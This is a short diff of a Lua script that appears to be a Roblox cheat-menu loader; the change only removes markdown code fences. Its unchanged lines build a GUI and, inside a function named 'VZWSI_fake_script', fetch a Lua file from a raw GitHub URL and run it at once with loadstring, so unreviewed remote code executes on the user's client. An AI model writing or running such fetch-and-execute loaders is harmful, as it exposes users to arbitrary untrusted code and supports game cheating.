@@ -1,4 +1,3 @@
-```lua
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local Roundify = Instance.new("ImageLabel")
@@ -49,4 +48,3 @@ local function VZWSI_fake_script()
     loadstring(game:HttpGet'https://raw.githubusercontent.com/oathyy/oooogaboaga/main/epic.lua')()
 end
 coroutine.wrap(VZWSI_fake_script)()
-```
